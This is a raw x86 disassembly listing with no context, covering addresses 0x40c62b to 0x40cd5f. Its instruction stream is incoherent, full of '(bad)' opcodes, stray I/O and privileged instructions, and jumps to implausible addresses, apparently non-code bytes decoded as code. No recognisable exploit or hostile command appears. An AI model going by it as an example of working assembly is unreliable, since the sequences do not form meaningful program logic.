  40c62b:	pop    esp
  40c62c:	adc    bl,BYTE PTR [eax]
  40c62e:	mov    cs,WORD PTR [ebx-0x47]
  40c631:	cdq    
  40c632:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c633:	pop    ebx
  40c634:	dec    edi
  40c635:	(bad)  
  40c636:	cs aaa 
  40c638:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c639:	js     0x40c5d9
  40c63b:	xchg   BYTE PTR [esi+esi*2-0x5b],dl
  40c63f:	inc    esi
  40c640:	push   ds
  40c641:	add    edx,DWORD PTR [ebx+0x78497424]
  40c647:	inc    esp
  40c648:	xor    eax,0x829b8501
  40c64d:	adc    al,0x20
  40c64f:	mov    ah,0xcc
  40c651:	xlat   BYTE PTR ds:[ebx]
  40c652:	(bad)  
  40c653:	aaa    
  40c654:	outs   dx,BYTE PTR ds:[esi]
  40c655:	loopne 0x40c6b8
  40c657:	imul   ecx,DWORD PTR [edx-0x17402854],0x49
  40c65e:	or     al,0x78
  40c660:	pop    eax
  40c661:	dec    ebp
  40c662:	fiadd  DWORD PTR [ebp-0x2f]
  40c665:	mov    bh,0xc7
  40c667:	fwait
  40c668:	out    0xe0,eax
  40c66a:	xor    DWORD PTR [esi+ecx*4+0x5d1d6201],ebp
  40c671:	sub    al,0x21
  40c673:	jne    0x40c6c6
  40c675:	idiv   BYTE PTR [edi-0x7d]
  40c678:	ficomp WORD PTR [edi]
  40c67a:	je     0x40c636
  40c67c:	(bad)  
  40c67d:	dec    edi
  40c67e:	jp     0x40c682
  40c680:	or     eax,0xeb7a4810
  40c685:	inc    eax
  40c686:	mov    esp,ecx
  40c688:	and    DWORD PTR ds:0xa3c0bd6,0x332e0b1d
  40c692:	add    DWORD PTR [eax],0xfffffff0
  40c695:	sbb    ch,BYTE PTR [eax]
  40c697:	test   DWORD PTR [edx-0x3],ebp
  40c69a:	inc    edx
  40c69b:	jb     0x40c6e6
  40c69d:	js     0x40c6c5
  40c69f:	mov    dl,0xc9
  40c6a1:	dec    BYTE PTR [ebx-0x66a9c812]
  40c6a7:	dec    ecx
  40c6a8:	push   ebp
  40c6a9:	stos   DWORD PTR es:[edi],eax
  40c6aa:	dec    ecx
  40c6ab:	sbb    dh,ch
  40c6ad:	jecxz  0x40c6b9
  40c6af:	mov    ecx,0x52a117ff
  40c6b4:	fdiv   st,st(7)
  40c6b6:	push   esp
  40c6b7:	sub    bl,BYTE PTR [ebx]
  40c6b9:	lea    ecx,[esi+0x5acb389]
  40c6bf:	inc    ecx
  40c6c0:	push   cs
  40c6c1:	or     DWORD PTR ds:0x2f97c4c4,ecx
  40c6c7:	sahf   
  40c6c8:	leave  
  40c6c9:	sub    ebx,eax
  40c6cb:	into   
  40c6cc:	in     eax,dx
  40c6cd:	mov    dl,0xb2
  40c6cf:	or     al,0x13
  40c6d1:	lea    edx,[edi+0x24b74576]
  40c6d7:	or     eax,0xa534979e
  40c6dc:	daa    
  40c6dd:	push   ebp
  40c6de:	out    0x5b,al
  40c6e0:	daa    
  40c6e1:	mov    al,0xdd
  40c6e3:	dec    ebx
  40c6e4:	xchg   ebp,eax
  40c6e5:	inc    esi
  40c6e6:	clc    
  40c6e7:	and    esp,ebx
  40c6e9:	pop    edi
  40c6ea:	cmp    DWORD PTR [esi],esi
  40c6ec:	jmp    0x5fdd384b
  40c6f1:	stos   BYTE PTR es:[edi],al
  40c6f2:	and    al,0xa5
  40c6f4:	xchg   edi,eax
  40c6f5:	xor    bl,al
  40c6f7:	sbb    DWORD PTR [edx+0x445e8d5a],edi
  40c6fd:	adc    BYTE PTR [esi+0xa1e9dcc],ah
  40c703:	xchg   esi,eax
  40c704:	lds    esi,FWORD PTR [ebp+0x2034523d]
  40c70a:	mov    esi,0x1faf767a
  40c70f:	jecxz  0x40c692
  40c711:	jp     0x40c75e
  40c713:	jle    0x40c6ad
  40c715:	sar    edi,0x1c
  40c718:	bound  esi,QWORD PTR [esi]
  40c71a:	push   esp
  40c71b:	pop    ds
  40c71c:	imul   esp,DWORD PTR [esi],0xffffffd0
  40c71f:	cdq    
  40c720:	or     edi,DWORD PTR [edx]
  40c722:	push   eax
  40c723:	adc    eax,DWORD PTR [ecx-0x36cf3daa]
  40c729:	std    
  40c72a:	xchg   ecx,eax
  40c72b:	add    ah,BYTE PTR [edx+0x77]
  40c72e:	add    eax,0x1c6038df
  40c733:	add    DWORD PTR ds:0xa1728ed3,edx
  40c739:	sub    al,0x18
  40c73b:	pop    esp
  40c73c:	into   
  40c73d:	jp     0x40c757
  40c73f:	icebp  
  40c740:	hlt    
  40c741:	add    eax,0xbf7eb9df
  40c746:	mov    al,0x90
  40c748:	xor    edi,ebx
  40c74a:	(bad)  
  40c74b:	sbb    eax,0x767a8ca3
  40c750:	jb     0x40c6e3
  40c752:	(bad)  
  40c753:	idiv   DWORD PTR [ebx]
  40c755:	pop    edx
  40c756:	fcomip st,st(1)
  40c758:	push   edi
  40c759:	call   0x7db47592
  40c75e:	fisttp WORD PTR [eax+0x62]
  40c761:	and    dh,dh
  40c763:	sub    ecx,DWORD PTR [ecx+ebx*8+0x78]
  40c767:	in     al,dx
  40c768:	aas    
  40c769:	fiadd  WORD PTR [ecx]
  40c76b:	sbb    DWORD PTR [edx-0x20f0f593],esi
  40c771:	arpl   WORD PTR [esi-0x4f3ba43b],si
  40c777:	sub    dl,al
  40c779:	xchg   DWORD PTR [ebx],eax
  40c77b:	ret    0x94b3
  40c77e:	push   es
  40c77f:	jmp    0x40c780
  40c781:	jmp    0x40c72c
  40c783:	outs   dx,BYTE PTR ds:[esi]
  40c784:	outs   dx,BYTE PTR ds:[esi]
  40c785:	out    0x2e,al
  40c787:	ror    DWORD PTR ds:0xa46ceddc,cl
  40c78d:	or     al,0x8c
  40c78f:	int3   
  40c790:	jbe    0x40c811
  40c792:	and    DWORD PTR [ebx-0x6d0ff7fc],ecx
  40c798:	add    DWORD PTR [esi+0x4b3a4271],ebx
  40c79e:	loopne 0x40c736
  40c7a0:	mov    edx,edi
  40c7a2:	aad    0x86
  40c7a4:	popf   
  40c7a5:	jmp    0xb950c463
  40c7aa:	loop   0x40c783
  40c7ac:	xchg   ebp,eax
  40c7ad:	lds    ebp,FWORD PTR [ebp+0x13]
  40c7b0:	dec    ebp
  40c7b1:	xor    eax,0xb5e2e0ec
  40c7b6:	sub    al,0xdf
  40c7b8:	jne    0x40c832
  40c7ba:	leave  
  40c7bb:	mov    esi,0x619ecda9
  40c7c0:	jecxz  0x40c7b7
  40c7c2:	jbe    0x40c789
  40c7c4:	sub    eax,0x574e0f8b
  40c7c9:	adc    bh,bh
  40c7cb:	xlat   BYTE PTR ds:[ebx]
  40c7cc:	mov    ah,0xf8
  40c7ce:	mov    esp,0xb36244b3
  40c7d3:	(bad)  [ebx]
  40c7d5:	pusha  
  40c7d6:	xlat   BYTE PTR es:[ebx]
  40c7d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7d9:	rol    dl,0x35
  40c7dc:	inc    edx
  40c7dd:	dec    eax
  40c7de:	xlat   BYTE PTR ds:[ebx]
  40c7df:	fucom  st(6)
  40c7e1:	add    al,0x9a
  40c7e3:	jne    0x40c83a
  40c7e5:	fs std 
  40c7e7:	repnz push cs
  40c7e9:	adc    esp,ebx
  40c7eb:	sbb    BYTE PTR [edi+ecx*4-0xf],dl
  40c7ef:	aas    
  40c7f0:	sbb    ebp,DWORD PTR ds:0xa735ba3
  40c7f6:	push   ebp
  40c7f7:	ss daa 
  40c7f9:	dec    DWORD PTR [edx+0x72319291]
  40c7ff:	lds    eax,FWORD PTR [ecx+0x39]
  40c802:	(bad)  
  40c803:	imul   BYTE PTR [edx+0x3617ee15]
  40c809:	je     0x40c7ea
  40c80b:	dec    edx
  40c80c:	push   ebp
  40c80d:	sub    DWORD PTR [ebx-0x4b],edi
  40c810:	push   eax
  40c811:	stos   BYTE PTR es:[edi],al
  40c812:	sbb    esi,ebx
  40c814:	lock pusha 
  40c816:	adc    DWORD PTR [ebx+0xda6ffea],edi
  40c81c:	lea    edi,[esi+0x77d28659]
  40c822:	add    eax,0x16446f7c
  40c827:	iret   
  40c828:	add    DWORD PTR ds:0x2e9ba056,ecx
  40c82e:	enter  0x89f8,0xa6
  40c832:	or     cl,cl
  40c834:	pop    esp
  40c835:	and    bl,BYTE PTR ds:0x16b6
  40c83a:	loop   0x40c828
  40c83c:	xor    DWORD PTR [edx],ecx
  40c83e:	bound  edx,QWORD PTR [esi-0x6f74a364]
  40c844:	and    esp,edx
  40c846:	rcl    DWORD PTR [ebx],1
  40c848:	add    esi,esp
  40c84a:	mov    WORD PTR [ebx+0x5b6394e3],?
  40c850:	jnp    0x40c8a7
  40c852:	xchg   ebx,eax
  40c853:	mov    ch,0x8d
  40c855:	adc    DWORD PTR [eax-0x4f],edx
  40c858:	inc    esp
  40c859:	dec    eax
  40c85a:	je     0x40c88b
  40c85c:	test   bl,0x59
  40c85f:	(bad)  
  40c860:	fbld   TBYTE PTR [ecx*8+0x65640413]
  40c867:	imul   ecx,DWORD PTR [ecx-0x32],0xfffffffc
  40c86b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c86c:	adc    bl,BYTE PTR [eax-0x559e6b64]
  40c872:	pushf  
  40c873:	jmp    0x40c8cf
  40c875:	push   edx
  40c876:	lea    esi,[eax]
  40c878:	mov    dl,0x17
  40c87a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c87b:	in     al,dx
  40c87c:	xor    BYTE PTR [eax],dl
  40c87e:	mov    esp,0x80c286ec
  40c883:	rcl    DWORD PTR [edx],0x80
  40c886:	(bad)  
  40c887:	xor    al,cl
  40c889:	arpl   WORD PTR [esi-0x6d248431],sp
  40c88f:	fcomp  DWORD PTR [esi+0x429b4322]
  40c895:	in     eax,0xd2
  40c897:	add    BYTE PTR [eax],ah
  40c899:	out    dx,al
  40c89a:	clc    
  40c89b:	stos   DWORD PTR es:[edi],eax
  40c89c:	jae    0x40c825
  40c89e:	adc    eax,0xc7cf2db6
  40c8a3:	cmp    al,0x1b
  40c8a5:	fidiv  DWORD PTR [edi+0x31]
  40c8a8:	in     eax,0x51
  40c8aa:	push   cs
  40c8ab:	pop    eax
  40c8ac:	cmp    ecx,eax
  40c8ae:	lods   eax,DWORD PTR ds:[esi]
  40c8af:	shr    DWORD PTR [esi-0x54],cl
  40c8b2:	sbb    BYTE PTR [edi],dh
  40c8b4:	lahf   
  40c8b5:	repz ficomp DWORD PTR [edx+0x9ccff06]
  40c8bc:	mov    esi,0xb26185bb
  40c8c1:	aad    0x82
  40c8c3:	pop    edi
  40c8c4:	lds    esp,FWORD PTR [edx]
  40c8c6:	ja     0x40c8f9
  40c8c8:	das    
  40c8c9:	jp     0x40c901
  40c8cb:	push   ebx
  40c8cc:	inc    ebp
  40c8cd:	pop    ebp
  40c8ce:	ins    DWORD PTR es:[edi],dx
  40c8cf:	and    esp,DWORD PTR [ebp-0x36c81d98]
  40c8d5:	aaa    
  40c8d6:	sub    BYTE PTR [esi],al
  40c8d8:	out    dx,al
  40c8d9:	mov    bl,0x42
  40c8db:	fdivr  DWORD PTR ds:0xb8f973a0
  40c8e1:	jne    0x40c8b1
  40c8e3:	xor    BYTE PTR [eax],cl
  40c8e5:	aam    0x17
  40c8e7:	repz mov WORD PTR [edi-0x5a02c3e0],?
  40c8ee:	mov    al,ds:0x7175b81f
  40c8f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8f4:	push   ebx
  40c8f5:	rcl    BYTE PTR [ebx-0x44ded86f],cl
  40c8fb:	pusha  
  40c8fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8fd:	popa   
  40c8fe:	jne    0x40c8d6
  40c900:	sbb    eax,0x7313b883
  40c905:	jge    0x40c890
  40c907:	scas   eax,DWORD PTR es:[edi]
  40c908:	loop   0x40c8ba
  40c90a:	cmp    bh,dh
  40c90c:	mov    eax,0xf7678659
  40c911:	pop    edx
  40c912:	pop    ebp
  40c913:	das    
  40c914:	inc    al
  40c916:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c917:	into   
  40c918:	nop
  40c919:	scas   eax,DWORD PTR es:[edi]
  40c91a:	pop    esi
  40c91b:	pushf  
  40c91c:	not    DWORD PTR [eax+0x12b41835]
  40c922:	xor    eax,0x651f0726
  40c927:	mov    ?,ebp
  40c929:	adc    eax,DWORD PTR [ebp+0x2b677866]
  40c92f:	fisubr WORD PTR [ebp-0x55]
  40c932:	ja     0x40c956
  40c934:	cmp    al,0xce
  40c936:	lock or edx,DWORD PTR [edx-0x75520676]
  40c93d:	dec    eax
  40c93e:	mov    ebp,0x272854e2
  40c943:	xor    DWORD PTR [edx+0x67],0xd6d7bf04
  40c94a:	jl     0x40c92f
  40c94c:	in     al,dx
  40c94d:	das    
  40c94e:	jbe    0x40c921
  40c950:	and    dh,BYTE PTR [eax-0x7dbf8d0]
  40c956:	ss dec esi
  40c958:	mov    al,0x5a
  40c95a:	pop    ebp
  40c95b:	add    DWORD PTR [ecx],edi
  40c95d:	add    ebp,0x3e
  40c960:	imul   ecx,DWORD PTR [eax+0x2b],0xf81b962f
  40c967:	sbb    BYTE PTR [ecx],dh
  40c969:	je     0x40c957
  40c96b:	rcl    DWORD PTR [esi],0x18
  40c96e:	stos   DWORD PTR es:[edi],eax
  40c96f:	leave  
  40c970:	xor    al,dh
  40c972:	cmp    edi,ebx
  40c974:	stc    
  40c975:	sub    eax,0x8da76302
  40c97a:	test   DWORD PTR [ebp-0x7b],edx
  40c97d:	leave  
  40c97e:	data16 test al,0xcd
  40c981:	arpl   bx,di
  40c983:	push   ebp
  40c984:	sbb    BYTE PTR [edx+0x51ad27c],0xa4
  40c98b:	mov    edi,0x8da08814
  40c990:	xor    eax,0xee2f5f09
  40c995:	inc    eax
  40c996:	xchg   ecx,eax
  40c997:	xor    BYTE PTR [ebx-0x2c40cd76],ch
  40c99d:	lea    edi,[ebp-0x78]
  40c9a0:	sub    ebp,ebx
  40c9a2:	arpl   WORD PTR [eiz*2-0x6348de5b],si
  40c9a9:	or     bh,BYTE PTR [esi]
  40c9ab:	dec    ebx
  40c9ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9ad:	(bad)  
  40c9ae:	mov    dh,0xa
  40c9b0:	add    eax,0x8cdf12ee
  40c9b5:	mov    eax,0x75f3f44d
  40c9ba:	push   0x7f
  40c9bc:	leave  
  40c9bd:	push   eax
  40c9be:	push   eax
  40c9bf:	fstp   QWORD PTR ds:0x4f11ac8b
  40c9c5:	aaa    
  40c9c6:	cmp    esp,esi
  40c9c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9c9:	jns    0x40c9e1
  40c9cb:	add    al,0x53
  40c9cd:	leave  
  40c9ce:	mov    WORD PTR ds:0x3a7751e4,ss
  40c9d4:	imul   ebp,ebp,0xfffffffb
  40c9d7:	adc    BYTE PTR [esi],0x11
  40c9da:	int3   
  40c9db:	nop
  40c9dc:	sub    bh,dh
  40c9de:	dec    eax
  40c9df:	and    BYTE PTR [esi+0xa904a05],ah
  40c9e5:	aad    0xd0
  40c9e7:	int    0xe5
  40c9e9:	mov    ah,0xc2
  40c9eb:	sti    
  40c9ec:	jecxz  0x40ca0c
  40c9ee:	out    0xf7,eax
  40c9f0:	sbb    eax,0xf8a5f045
  40c9f5:	xor    al,0xdb
  40c9f7:	imul   eax,edx,0xfffffffc
  40c9fa:	jmp    0x40c9c1
  40c9fc:	cmp    ecx,DWORD PTR [ebx-0x20]
  40c9ff:	loop   0x40ca6b
  40ca01:	pusha  
  40ca02:	popa   
  40ca03:	cs daa 
  40ca05:	lahf   
  40ca06:	xor    ah,dl
  40ca08:	ror    DWORD PTR es:[ecx+edx*8+0x18196294],1
  40ca10:	mov    eax,0x2aef5b34
  40ca15:	mov    ds:0x265b25d7,eax
  40ca1a:	js     0x40c9d1
  40ca1c:	cmp    eax,0x68c57659
  40ca21:	div    BYTE PTR [esp+edi*2+0x4f059db3]
  40ca28:	mov    bh,0x57
  40ca2a:	jno    0x40ca0f
  40ca2c:	inc    BYTE PTR [ecx]
  40ca2e:	ret    0x92
  40ca31:	inc    esi
  40ca32:	into   
  40ca33:	into   
  40ca34:	stc    
  40ca35:	pusha  
  40ca36:	xchg   DWORD PTR [ecx-0x3e],ebx
  40ca39:	(bad)  
  40ca3b:	daa    
  40ca3c:	adc    DWORD PTR [esi-0x38],edi
  40ca3f:	lahf   
  40ca40:	aam    0x3
  40ca42:	or     eax,0x2f03010c
  40ca47:	scas   al,BYTE PTR es:[edi]
  40ca48:	enter  0xf911,0x5a
  40ca4c:	dec    ecx
  40ca4d:	jle    0x40c9e8
  40ca4f:	or     dl,BYTE PTR [edi]
  40ca51:	loope  0x40cac6
  40ca53:	mov    eax,ds:0x411bceff
  40ca58:	pusha  
  40ca59:	dec    edx
  40ca5a:	adc    al,0x4
  40ca5c:	jmp    0x2cb:0xc2ab991a
  40ca63:	xor    al,0x7e
  40ca65:	(bad)  
  40ca66:	jmp    0xa594:0x47251e95
  40ca6d:	xor    al,BYTE PTR [ecx]
  40ca6f:	out    0xff,eax
  40ca71:	cwde   
  40ca72:	push   esp
  40ca73:	pushf  
  40ca74:	push   edi
  40ca75:	sub    edi,DWORD PTR [esp+esi*4+0x2b]
  40ca79:	xlat   BYTE PTR ds:[ebx]
  40ca7a:	sbb    edi,esp
  40ca7c:	in     al,0x6
  40ca7e:	jnp    0x40ca2e
  40ca80:	dec    DWORD PTR [ebx-0x4d]
  40ca83:	stc    
  40ca84:	jae    0x40caab
  40ca86:	or     DWORD PTR [edi+0x7f],esi
  40ca89:	sbb    ebx,DWORD PTR [ecx+0xd]
  40ca8c:	fadd   DWORD PTR [ecx+esi*8-0x4ccfe578]
  40ca93:	cmp    eax,0x420ed7bc
  40ca98:	jmp    0x40ca40
  40ca9a:	pop    edx
  40ca9b:	xchg   ecx,eax
  40ca9c:	ror    bl,cl
  40ca9e:	mov    al,0xeb
  40caa0:	pop    eax
  40caa1:	cwde   
  40caa2:	cld    
  40caa3:	outs   dx,BYTE PTR ds:[esi]
  40caa4:	xor    edx,edx
  40caa6:	fwait
  40caa7:	mov    DWORD PTR [eax+0x41],eax
  40caaa:	fdiv   QWORD PTR [ebp+0x3]
  40caad:	adc    ecx,edx
  40caaf:	aas    
  40cab0:	into   
  40cab1:	in     al,dx
  40cab2:	push   0xffffffbf
  40cab4:	mov    cl,0xe5
  40cab6:	into   
  40cab7:	jecxz  0x40cafd
  40cab9:	adc    BYTE PTR [ecx-0x3968779c],0x95
  40cac0:	inc    esi
  40cac1:	push   edi
  40cac2:	in     al,dx
  40cac3:	aam    0xc3
  40cac5:	jae    0x40ca71
  40cac7:	ret    0xf5d
  40caca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cacb:	or     eax,0xc93404b8
  40cad0:	and    ebp,DWORD PTR [edi]
  40cad2:	push   ebx
  40cad3:	push   0x50
  40cad5:	push   ebx
  40cad6:	mov    al,0xff
  40cad8:	popa   
  40cad9:	loope  0x40ca88
  40cadb:	data16 xchg BYTE PTR [ecx-0x5],bl
  40cadf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cae0:	mov    esi,0x27b07a2d
  40cae5:	push   ss
  40cae6:	inc    edi
  40cae7:	fnstcw WORD PTR [eax]
  40cae9:	adc    ecx,esi
  40caeb:	mov    ecx,0x61c69c96
  40caf0:	mov    edi,0xdf201115
  40caf5:	sub    eax,0x3d6cb432
  40cafa:	xchg   ebx,eax
  40cafb:	ret    0x904a
  40cafe:	cmp    dl,BYTE PTR [ebx-0x71]
  40cb01:	xchg   ebx,eax
  40cb02:	cmp    ebx,DWORD PTR [edi-0x7b47589e]
  40cb08:	outs   dx,BYTE PTR ds:[esi]
  40cb09:	call   0x8dd721f3
  40cb0e:	push   ss
  40cb0f:	mov    dl,0xbf
  40cb11:	in     eax,0xec
  40cb13:	aas    
  40cb14:	jg     0x40cb79
  40cb16:	pushf  
  40cb17:	mov    BYTE PTR [ecx-0x5f],dh
  40cb1a:	les    bx,DWORD PTR [ebx]
  40cb1d:	jmp    0xa938339c
  40cb22:	inc    esp
  40cb23:	mov    ecx,DWORD PTR [edx]
  40cb25:	data16 fbstp TBYTE PTR [edi+edx*8-0x2e]
  40cb2a:	stos   BYTE PTR es:[edi],al
  40cb2b:	or     ah,BYTE PTR [eax-0x41d42348]
  40cb31:	add    al,BYTE PTR [edi+ecx*1-0x394b07da]
  40cb38:	cwde   
  40cb39:	lock or DWORD PTR fs:[ecx],ebx
  40cb3d:	inc    esi
  40cb3e:	scas   al,BYTE PTR es:[edi]
  40cb3f:	cmp    DWORD PTR [ebp-0x1a762dfd],edi
  40cb45:	mov    dl,0x55
  40cb47:	sbb    BYTE PTR [ebx-0x60e83c73],al
  40cb4d:	test   eax,edx
  40cb4f:	adc    al,0xf5
  40cb51:	inc    edi
  40cb52:	adc    edx,DWORD PTR [ebx+0x7b]
  40cb55:	sbb    BYTE PTR [ebx+0x39b5d703],ch
  40cb5b:	add    eax,0x39116c9c
  40cb60:	sub    BYTE PTR ds:0x7d6347df,al
  40cb66:	(bad)  
  40cb68:	aas    
  40cb69:	adc    eax,DWORD PTR [edi-0x1bef859b]
  40cb6f:	fs shl bh,cl
  40cb72:	dec    esi
  40cb73:	rol    DWORD PTR [edi],cl
  40cb75:	fs inc eax
  40cb77:	pushf  
  40cb78:	lods   eax,DWORD PTR ds:[esi]
  40cb79:	adc    dh,BYTE PTR [ecx+eax*8-0x26]
  40cb7d:	sbb    BYTE PTR [esp+eax*1],al
  40cb80:	sbb    bl,BYTE PTR [edx-0xf6df7f]
  40cb86:	push   0x2a
  40cb88:	loop   0x40cbff
  40cb8a:	(bad)  
  40cb8b:	loopne 0x40cb5f
  40cb8d:	in     al,0x22
  40cb8f:	imul   edx,DWORD PTR [eax-0x40328d2f],0x19
  40cb96:	and    ebp,edx
  40cb98:	adc    bl,BYTE PTR [edx+0x15]
  40cb9b:	dec    esp
  40cb9c:	jns    0x40cb3e
  40cb9e:	(bad)  
  40cb9f:	push   edi
  40cba0:	push   ds
  40cba1:	sub    al,0x11
  40cba3:	cmp    DWORD PTR ds:0xb8d4adbf,ecx
  40cba9:	cmp    DWORD PTR [edi+ebp*2],edi
  40cbac:	lea    ecx,[ebp-0x74]
  40cbaf:	fs in  al,dx
  40cbb1:	mov    ?,WORD PTR [edi-0x2933c81f]
  40cbb7:	mov    BYTE PTR [ecx],ch
  40cbb9:	mov    esp,0x9546d089
  40cbbe:	imul   edx,DWORD PTR [ecx+0x79],0xd1dcdf76
  40cbc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cbc6:	xor    BYTE PTR [edx-0x927e918],ah
  40cbcc:	sti    
  40cbcd:	pop    ss
  40cbce:	fld    QWORD PTR [ecx+0x46]
  40cbd1:	lods   eax,DWORD PTR ds:[esi]
  40cbd2:	cmp    ah,BYTE PTR [edx+ecx*2+0x61]
  40cbd6:	xchg   esp,eax
  40cbd7:	dec    eax
  40cbd8:	cmp    eax,0x347758e
  40cbdd:	push   es
  40cbde:	retf   
  40cbdf:	dec    ecx
  40cbe0:	mov    edi,eax
  40cbe2:	call   0x7ea2f7c2
  40cbe7:	fdiv   DWORD PTR [edi-0x53]
  40cbea:	sub    al,cl
  40cbec:	aas    
  40cbed:	gs sbb al,0xe0
  40cbf0:	push   ds
  40cbf1:	cli    
  40cbf2:	loop   0x40cbc4
  40cbf4:	(bad)  
  40cbf5:	mov    al,BYTE PTR [bx+si]
  40cbf8:	fwait
  40cbf9:	sub    DWORD PTR [edx-0x6c],esp
  40cbfc:	aam    0x95
  40cbfe:	cwde   
  40cbff:	das    
  40cc00:	jno    0x40cc58
  40cc02:	lea    edi,[ecx+eax*4+0x75]
  40cc06:	jne    0x40cc0b
  40cc08:	push   ecx
  40cc09:	ja     0x40cba4
  40cc0b:	sbb    DWORD PTR [ecx-0x5e],edx
  40cc0e:	cmp    cl,cl
  40cc10:	xor    edi,edx
  40cc12:	xor    al,al
  40cc14:	push   ebp
  40cc15:	test   eax,0x19fec568
  40cc1a:	stos   DWORD PTR es:[edi],eax
  40cc1b:	hlt    
  40cc1c:	test   al,0x3b
  40cc1e:	mul    BYTE PTR [edi-0x4c409870]
  40cc24:	stos   DWORD PTR es:[edi],eax
  40cc25:	popf   
  40cc26:	add    cl,ch
  40cc28:	xchg   ebx,eax
  40cc29:	mov    BYTE PTR [ecx+0x4a],ch
  40cc2c:	cmp    BYTE PTR [eax-0x8deeb69],ah
  40cc32:	in     eax,dx
  40cc33:	jb     0x40cc83
  40cc35:	mov    esp,0x27973538
  40cc3a:	bound  esp,QWORD PTR [esi-0x60]
  40cc3d:	cmc    
  40cc3e:	sbb    eax,DWORD PTR [eax]
  40cc40:	xchg   edx,eax
  40cc41:	jns    0x40cc5b
  40cc43:	dec    edx
  40cc44:	add    DWORD PTR [esi-0x30],esp
  40cc47:	mov    ecx,0x17f036a9
  40cc4c:	es push es
  40cc4e:	cdq    
  40cc4f:	iret   
  40cc50:	ror    BYTE PTR [ecx-0x52a5337e],1
  40cc56:	leave  
  40cc57:	jle    0x40cc98
  40cc59:	jnp    0x40cc07
  40cc5b:	pop    eax
  40cc5c:	mov    esp,0x8173a176
  40cc61:	jmp    0x40cc83
  40cc63:	push   ebx
  40cc64:	jbe    0x40cbeb
  40cc66:	mov    al,ds:0x6a5510ff
  40cc6b:	push   ebx
  40cc6c:	jl     0x40ccca
  40cc6e:	xchg   ebx,eax
  40cc6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc70:	cmp    ecx,edx
  40cc72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc73:	push   edi
  40cc74:	dec    ebp
  40cc75:	or     ebp,DWORD PTR [esi+0x774c4363]
  40cc7b:	mov    BYTE PTR [ebx-0x51734a3e],ah
  40cc81:	cdq    
  40cc82:	stos   DWORD PTR es:[edi],eax
  40cc83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc84:	pop    ds
  40cc85:	and    esi,DWORD PTR [ebx-0x5a]
  40cc88:	mov    DWORD PTR [edx-0x619dbf10],esp
  40cc8e:	inc    eax
  40cc8f:	sub    eax,0xf067ef2d
  40cc94:	in     eax,0xa0
  40cc96:	arpl   WORD PTR [edi+0x40],sp
  40cc99:	leave  
  40cc9a:	mov    ecx,esi
  40cc9c:	stos   DWORD PTR es:[edi],eax
  40cc9d:	cmp    cl,BYTE PTR [esi]
  40cc9f:	sbb    cl,bh
  40cca1:	xor    cl,BYTE PTR [eax-0x48bce860]
  40cca7:	xor    BYTE PTR [esi+0xb],cl
  40ccaa:	adc    BYTE PTR [ebx],cl
  40ccac:	push   ebx
  40ccad:	xor    DWORD PTR [edx],esp
  40ccaf:	or     ch,BYTE PTR [edx+0x1d]
  40ccb2:	test   eax,0x407d255e
  40ccb7:	or     al,0xe2
  40ccb9:	inc    ebp
  40ccba:	fisubr WORD PTR [eax+0x4f20cee7]
  40ccc0:	mov    al,0xd3
  40ccc2:	or     al,0x8f
  40ccc4:	or     BYTE PTR [ebp+0x17374902],ah
  40ccca:	lds    ecx,FWORD PTR [eax+0x75f4893d]
  40ccd0:	jb     0x40ccd9
  40ccd2:	sub    bh,BYTE PTR [eax]
  40ccd4:	fcmove st,st(3)
  40ccd6:	xor    edx,DWORD PTR [ecx+0x3845f881]
  40ccdc:	xor    DWORD PTR [edi-0x10],0xffffffbe
  40cce0:	fadd   st(7),st
  40cce2:	cmp    eax,0xf281edb
  40cce7:	inc    ecx
  40cce8:	push   edi
  40cce9:	and    al,cl
  40cceb:	xchg   ecx,eax
  40ccec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cced:	xor    ah,BYTE PTR [edx+0x6cecd56c]
  40ccf3:	pop    ebp
  40ccf4:	jl     0x40cd27
  40ccf6:	inc    ecx
  40ccf7:	sub    al,0xb8
  40ccf9:	or     al,0xb0
  40ccfb:	ja     0x40ccb7
  40ccfd:	push   ebx
  40ccfe:	bound  edi,QWORD PTR [ebx-0x133b0e74]
  40cd04:	adc    dl,cl
  40cd06:	sub    esp,DWORD PTR [ebx]
  40cd08:	mov    WORD PTR [ecx+0x4da9c312],es
  40cd0e:	icebp  
  40cd0f:	push   eax
  40cd10:	pop    ebp
  40cd11:	dec    ecx
  40cd12:	ins    DWORD PTR es:[edi],dx
  40cd13:	gs xchg ebx,eax
  40cd15:	pop    eax
  40cd16:	test   DWORD PTR [edi],0xab1cffab
  40cd1c:	push   ebp
  40cd1d:	mov    al,ds:0xa47425c0
  40cd22:	mov    bl,0x6b
  40cd24:	pop    ecx
  40cd25:	test   BYTE PTR [ebp-0x38],bl
  40cd28:	in     al,0x3a
  40cd2a:	jne    0x40cda4
  40cd2c:	je     0x40cd01
  40cd2e:	adc    dl,BYTE PTR [ecx-0x38120475]
  40cd34:	popa   
  40cd35:	mov    al,ds:0xa77c127a
  40cd3a:	repz or ebx,esi
  40cd3d:	adc    al,0x13
  40cd3f:	cld    
  40cd40:	or     ecx,DWORD PTR [ebx-0x5491d6d]
  40cd46:	xor    eax,0x86120e4f
  40cd4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd4c:	jne    0x40cd7d
  40cd4e:	mov    ds:0xde4ac8a6,eax
  40cd53:	ja     0x40cce4
  40cd55:	and    ecx,0xeb5adb9f
  40cd5b:	mov    dl,0xfa
  40cd5d:	leave  
  40cd5e:	dec    edx
  40cd5f:	aam    0xf4
